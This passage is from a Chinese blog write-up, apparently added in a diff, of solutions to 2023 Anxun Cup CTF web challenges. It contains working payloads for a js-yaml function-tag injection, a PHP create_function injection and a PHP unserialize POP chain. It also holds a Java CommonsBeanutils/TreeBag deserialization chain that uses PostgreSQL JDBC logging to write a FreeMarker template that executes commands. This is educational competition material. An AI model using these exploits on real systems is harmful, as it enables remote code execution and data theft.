+	&#125; <span class="hljs-keyword">else</span> &#123;
+		res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Permission denied.&#x27;</span>);
+	&#125;
+&#125;)
+
+app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;
+	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`App is running on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)
+&#125;)</code></pre></div>
+
+
+
+<p>js-yaml的版本是3.14.1，在github上找到文档，</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225143227242.png" srcset="/img/loading.gif" lazyload alt="image-20231225143227242"></p>
+<p>发现三个标签</p>
+<blockquote>
+<p>js-yaml extra types:</p>
+<ul>
+<li>!!js&#x2F;regexp &#x2F;pattern&#x2F;gim</li>
+<li>!!js&#x2F;undefined ‘’</li>
+<li>!!js&#x2F;function ‘function () {…}’</li>
+</ul>
+</blockquote>
+<p>查看版本升级时的变动，说是危险的标签，说明可以利用</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225144028049.png" srcset="/img/loading.gif" lazyload alt="image-20231225144028049"></p>
+<p>又因为</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225144401766.png" srcset="/img/loading.gif" lazyload alt="image-20231225144401766"></p>
+<p>若使用数组或对象作为键，会调用他的<code>toString()</code>方法，</p>
+<p>官方payload：</p>
+<p>上传文件后缀为yaml，内容为</p>
+<div class="code-wrapper"><pre><code class="hljs lua"><span class="hljs-string">&quot;name&quot;</span> : &#123; toString: !!js/<span class="hljs-function"><span class="hljs-keyword">function</span> &quot;<span class="hljs-title">function</span><span class="hljs-params">()</span></span>&#123; flag = process.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat /fla*&#x27;</span>).toString(); <span class="hljs-keyword">return</span> flag;&#125;<span class="hljs-string">&quot;&#125;</span></code></pre></div>
+
+<p>经历load-&gt;dump-&gt;load，最后渲染到ejs的name回显出来</p>
+<p>赛后搜索到的文章，直接就是payload了</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225153202302.png" srcset="/img/loading.gif" lazyload alt="image-20231225153202302"></p>
+<h2 id="what’s-my-name"><a href="#what’s-my-name" class="headerlink" title="what’s my name*"></a>what’s my name*</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">highlight_file</span>(__file__);
+<span class="hljs-variable">$d0g3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d0g3&#x27;</span>];
+<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(?:.&#123;5&#125;)*include/&#x27;</span>,<span class="hljs-variable">$d0g3</span>))&#123;
+    <span class="hljs-variable">$sorter</span>=<span class="hljs-string">&#x27;strnatcasecmp&#x27;</span>;
+    <span class="hljs-variable">$miao</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);
+    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$miao</span>);
+    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$d0g3</span>)==<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$miao</span>, -<span class="hljs-number">2</span>)&amp;&amp;<span class="hljs-variable">$name</span>===<span class="hljs-variable">$miao</span>)&#123;
+        <span class="hljs-variable">$sort_function</span> = <span class="hljs-string">&#x27; return 1 * &#x27;</span> . <span class="hljs-variable">$sorter</span> . <span class="hljs-string">&#x27;($a[&quot;&#x27;</span> . <span class="hljs-variable">$d0g3</span> . <span class="hljs-string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="hljs-variable">$d0g3</span> . <span class="hljs-string">&#x27;&quot;]);&#x27;</span>;
+        @<span class="hljs-variable">$miao</span>=<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a, $b&#x27;</span>, <span class="hljs-variable">$sort_function</span>);
+    &#125;
+    <span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;Is That My Name?&#x27;</span>);
+    &#125;
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;YOU Do Not Know What is My Name!&quot;</span>);
+&#125;</code></pre></div>
+
+
+
+<p><code>preg_match(&#39;/^(?:.&#123;5&#125;)*include/&#39;,$d0g3)</code></p>
+<p>5的倍数个字符拼接<code>include</code></p>
+<p><code>$miao = create_function(&#39;$a,$b&#39;, &#39;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#39;);</code></p>
+<p>本地打印出$miao的值，是匿名函数的名称，<code>\x00lambda_%d</code>，并且每刷新一次页面，%d就加1</p>
+<p>然后就是create_function漏洞，上网搜就可以</p>
+<p>payload: <code>&quot;]);&#125;phpinfo();/*</code></p>
+<p>知道这些就可以做题了</p>
+<p>根据这个payload要满足第一个if条件，给他加字符</p>
+<p><code>&quot;]);&#125;phpinfo();/*123include</code> （include前面为20个字符，满足条件）</p>
+<p>这个长度为27，<code>substr($miao, -2)</code>也要为27，就不断刷新到27即可</p>
+<p><code>$name===$miao</code> ，那就是匿名函数的名字，直接让他等于满足条件的情况即可 ，即<code>\x00lambda_27</code></p>
+<p>最终payload</p>
+<div class="code-wrapper"><pre><code class="hljs 1c">?d0g3=<span class="hljs-string">&quot;]);&#125;phpinfo();/*123include&amp;name=%00lambda_27</span>
+
+刷新<span class="hljs-number">27</span>次即可，反正一直刷新就对了</code></pre></div>
+
+
+
+<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize*"></a>ez_unserialize*</h2><p>确实挺简单的，因为非预期了</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;gg2))
+        &#123;
+            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;gg2)
+            &#123;
+                <span class="hljs-variable language_">$this</span>-&gt;g1-&gt;g1=<span class="hljs-number">666</span>;
+            &#125;
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;ll2-&gt;<span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)
+        &#123;
+            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;arg1)===<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))
+        &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;tt2-&gt;tt2)
+        &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;what are you doing?&quot;</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$SplFileObject</span> = <span class="hljs-string">&quot;/FfffLlllLaAaaggGgGg&quot;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;
+        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;
+            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);
+            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;
+                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);
+            &#125;
+        &#125;);
+    &#125;
+&#125;
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();
+<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>(<span class="hljs-string">&quot;eS&quot;</span>);
+<span class="hljs-variable">$b</span>-&gt;l1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();
+<span class="hljs-variable">$a</span>-&gt;y1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>(<span class="hljs-string">&quot;eS&quot;</span>);
+
+<span class="hljs-variable">$a</span>-&gt;y1-&gt;lll3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Good</span>(<span class="hljs-variable">$b</span>);
+
+
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));
+</code></pre></div>
+
+<p>原生类遍历和读取文件，不想说了</p>
+<p>给出官方wp中有趣的地方</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160010951.png" srcset="/img/loading.gif" lazyload alt="image-20231225160010951"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160032682.png" srcset="/img/loading.gif" lazyload alt="image-20231225160032682"></p>
+<h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p>看的最久的一道题，思路都对了，但是不会补链子，唉。。。。</p>
+<p>因为前不久才看过羊城杯的那道<code>freemarker</code>，所以看到文件有<code>index.ftl</code>时，我就知道要用<code>freemarker</code>模板注入了</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160716321.png" srcset="/img/loading.gif" lazyload alt="image-20231225160716321"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160502576.png" srcset="/img/loading.gif" lazyload alt="image-20231225160502576"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160531450.png" srcset="/img/loading.gif" lazyload alt="image-20231225160531450"></p>
+<p>依赖挺少的，很容易有思路</p>
+<h4 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h4><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-variable">$D0g3CTF</span> &gt; /flag
+<span class="hljs-built_in">chmod</span> 444 /flag
+<span class="hljs-built_in">unset</span> D0g3CTF
+iptables -P INPUT ACCEPT
+iptables -F
+iptables -X
+iptables -Z
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A OUTPUT -m state --state NEW -j DROP
+iptables -P OUTPUT DROP
+iptables -n -L
+java -jar /app/ezjava.jar</code></pre></div>
+
+<p>所以使用freemarker模板注入</p>
+<p><code>postgresql</code>任意文件写入覆盖<code>index.ftl</code>的内容，进行freemarker模板注入</p>
+<p>并且&#x2F;read路由是要readObject，</p>
+<p><code>postgresql</code>的利用要配合cb链</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225161651950.png" srcset="/img/loading.gif" lazyload alt="image-20231225161651950"></p>
+<p>但是DriverManager没有继承序列化接口，</p>
+<h4 id="getter"><a href="#getter" class="headerlink" title="getter"></a>getter</h4><p>CB链来调用<code>getter</code>方法来触发postgresql JDBC攻击，对应的getter方法为<code>BaseDataSource#getConnection</code>（给了提示）</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226231442673.png" srcset="/img/loading.gif" lazyload alt="image-20231226231442673"></p>
+<p>但是关键的<code>java.util.PriorityQueue</code>被禁了，那就要找替代类</p>
+<div class="code-wrapper"><pre><code class="hljs markdown">/**
+<span class="hljs-bullet"> *</span> exec:347, Runtime (java.lang)
+<span class="hljs-bullet"> *</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">init</span>&gt;</span></span>:-1, a
+<span class="hljs-bullet"> *</span> newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> newInstance:422, Constructor (java.lang.reflect)
+<span class="hljs-bullet"> *</span> newInstance:442, Class (java.lang)
+<span class="hljs-bullet"> *</span> getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+<span class="hljs-bullet"> *</span> newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+<span class="hljs-bullet"> *</span> getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+<span class="hljs-bullet"> *</span> invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> invoke:62, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> invoke:497, Method (java.lang.reflect)
+<span class="hljs-bullet"> *</span> invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)
+<span class="hljs-bullet"> *</span> getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)
+<span class="hljs-bullet"> *</span> getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)
+<span class="hljs-bullet"> *</span> getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)
+<span class="hljs-bullet"> *</span> getProperty:464, PropertyUtils (org.apache.commons.beanutils)
+<span class="hljs-bullet"> *</span> compare:163, BeanComparator (org.apache.commons.beanutils)
+<span class="hljs-bullet"> *</span> siftDownUsingComparator:721, PriorityQueue (java.util)
+<span class="hljs-bullet"> *</span> siftDown:687, PriorityQueue (java.util)
+<span class="hljs-bullet"> *</span> heapify:736, PriorityQueue (java.util)
+<span class="hljs-bullet"> *</span> readObject:795, PriorityQueue (java.util)
+<span class="hljs-bullet"> *</span> invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> invoke:62, NativeMethodAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+<span class="hljs-bullet"> *</span> invoke:497, Method (java.lang.reflect)
+<span class="hljs-bullet"> *</span> invokeReadObject:1058, ObjectStreamClass (java.io)
+<span class="hljs-bullet"> *</span> readSerialData:1900, ObjectInputStream (java.io)
+<span class="hljs-bullet"> *</span> readOrdinaryObject:1801, ObjectInputStream (java.io)
+<span class="hljs-bullet"> *</span> readObject0:1351, ObjectInputStream (java.io)
+<span class="hljs-bullet"> *</span> readObject:371, ObjectInputStream (java.io)
+<span class="hljs-bullet"> *</span> base64deserial:66, SerializeUtils (com.javasec.utils)
+<span class="hljs-bullet"> *</span> deserTester:312, SerializeUtils (com.javasec.utils)
+<span class="hljs-bullet"> *</span> main:22, cb1 (com.javasec.pocs.cb)
+ <span class="hljs-emphasis">*/</span></code></pre></div>
+
+<p><code>BeanComparator</code>调用的是<code>compare</code>方法，要找类进行替代</p>
+<h3 id="TreeMap-TreeBag-–强大的Boogipop大佬"><a href="#TreeMap-TreeBag-–强大的Boogipop大佬" class="headerlink" title="TreeMap&#x2F;TreeBag       –强大的Boogipop大佬"></a>TreeMap&#x2F;TreeBag       –强大的Boogipop大佬</h3><p>TreeBag的readObject</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225172848202.png" srcset="/img/loading.gif" lazyload alt="image-20231225172848202"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173022808.png" srcset="/img/loading.gif" lazyload alt="image-20231225173022808"></p>
+<p>TreeMap的put</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173116722.png" srcset="/img/loading.gif" lazyload alt="image-20231225173116722"></p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173148534.png" srcset="/img/loading.gif" lazyload alt="image-20231225173148534"></p>
+<p>使<code>comparator</code>为<code>BeanComparator</code>即可</p>
+<h4 id="getter-1"><a href="#getter-1" class="headerlink" title="getter"></a>getter</h4><p>找到的是<code>pgConnectionPoolDataSource</code>，他是抽象类<code>BaseDataSource</code>的实现类，而<code>BaseDataSource</code>存在<code>getConnection</code></p>
+<p>是继承<code>BaseDataSource</code>的都行</p>
+<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    <span class="hljs-type">PGConnectionPoolDataSource</span> <span class="hljs-variable">pgConnectionPoolDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PGConnectionPoolDataSource</span>();
+    <span class="hljs-type">String</span> <span class="hljs-variable">loggerLevel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;debug&quot;</span>;
+    <span class="hljs-type">String</span> <span class="hljs-variable">loggerFile</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/app/templates/index.ftl&quot;</span>;
+    String shellContent=<span class="hljs-string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span>+<span class="hljs-string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span>+<span class="hljs-string">&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span>+<span class="hljs-string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>;
+    System.out.println(shellContent);
+    <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:postgresql://&quot;</span>+<span class="hljs-string">&quot;123&quot;</span>+<span class="hljs-string">&quot;/aaaa?ApplicationName=&quot;</span>+<span class="hljs-string">&quot;123123123&quot;</span>+<span class="hljs-string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="hljs-string">&quot;&amp;loggerLevel=&quot;</span>+loggerLevel;
+    pgConnectionPoolDataSource.setURL(jdbcUrl);
+    pgConnectionPoolDataSource.setServerNames(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;shellContent&#125;);
+
+
+    <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();
+    setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;connection&quot;</span>);
+
+
+    <span class="hljs-type">TreeBag</span> <span class="hljs-variable">treeBag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeBag</span>(comparator);
+    TreeMap&lt;Object,Object&gt; m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();
+    setFieldValue(m, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);
+    setFieldValue(m, <span class="hljs-string">&quot;modCount&quot;</span>, <span class="hljs-number">2</span>);
+    Class&lt;?&gt; nodeC = Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);
+    <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
+    nodeCons.setAccessible(<span class="hljs-literal">true</span>);
+    <span class="hljs-type">Object</span> <span class="hljs-variable">MutableInteger</span> <span class="hljs-operator">=</span> createWithoutConstructor(<span class="hljs-string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);
+    <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, <span class="hljs-literal">null</span>);
+    <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);
+    setFieldValue(node, <span class="hljs-string">&quot;right&quot;</span>, right);
+    setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);
+    setFieldValue(m, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);
+    setFieldValue(treeBag,<span class="hljs-string">&quot;map&quot;</span>,m);
+    System.out.println(base64serial(treeBag));
+    deserTester(treeBag);
+&#125;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+    oos.writeObject(o);
+    oos.close();
+
+    <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+    <span class="hljs-keyword">return</span> base64String;
+
+&#125;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">base64deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);
+    ois.readObject();
+    ois.close();
+&#125;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserTester</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    base64deserial(base64serial(o));
+&#125;
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">createWithoutConstructor</span><span class="hljs-params">(String classname)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+    <span class="hljs-keyword">return</span> createWithoutConstructor(Class.forName(classname));
+&#125;
